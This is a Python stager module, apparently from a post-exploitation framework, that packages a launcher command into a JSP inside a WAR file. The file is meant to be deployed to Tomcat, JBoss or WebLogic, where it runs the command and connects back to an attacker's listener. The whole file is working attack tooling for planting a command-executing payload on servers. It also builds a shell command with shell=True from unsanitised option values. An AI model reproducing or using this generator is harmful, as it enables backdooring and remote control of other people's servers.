from lib.common import helpers
import subprocess

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'WAR',

            'Author': ['Andrew @ch33kyf3ll0w Bonstrom'],

            'Description': ('Generates a Deployable War file.'),

            'Comments': [
                'You will need to deploy the WAR file to activate. Great for interfaces that accept a WAR file such as Apache Tomcat, JBoss, or Oracle Weblogic Servers.'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutDir' : {
                'Description'   :   'Directory to output WAR to.',
                'Required'      :   True,
                'Value'         :   '/tmp/'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
	directoryName = self.options['OutDir']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
	elif directoryName[-1] != "/":
            print helpers.color("[!] Error in OutDir Value. Please specify path like '/tmp/'")
            return ""
	else:
	#Create initial JSP and Web XML Strings with placeholders
		jspCode = '''<%@ page import="java.io.*" %>
			<% 
			Process p=Runtime.getRuntime().exec("launcher");
			%>
			'''
 
		wxmlCode = '''<?xml version="1.0"?>
			<!DOCTYPE web-app PUBLIC 
			"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
			"http://java.sun.com/dtd/web-app_2_3.dtd">
			<web-app>
			<servlet>
			<servlet-name>listenerName</servlet-name>
			<jsp-file>/listenerName.jsp</jsp-file>
			</servlet>
			</web-app>
			'''
		#Replace String placeholders with defined content
		jspCode = jspCode.replace("launcher", launcher)
		wxmlCode = wxmlCode.replace("listenerName", listenerName, 2)
		#Write out  modified strings to apropriate files
		with open(directoryName + listenerName + ".jsp", "w") as jspFile:
			jspFile.write(jspCode)
		with open(directoryName + "web.xml", "w") as webxmlFile:
			webxmlFile.write(wxmlCode)
		#Create necessary directory structure, move files into appropriate place, compile, and delete unncessary left over content
		proc = subprocess.call("cd "+ directoryName + "&&mkdir warDir&&mkdir warDir/WEB-INF&&mv listenerName.jsp warDir&&mv web.xml warDir/WEB-INF&&cd warDir&&jar cvf listenerName.war *&&mv listenerName.war ../&&cd ..&&rm -rf warDir".replace ("listenerName", listenerName, 3), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		
        return "Your file " + listenerName + ".war was successfully generated and placed within " + directoryName +". Please note that the .war and .jsp are both named after the specified Listener."
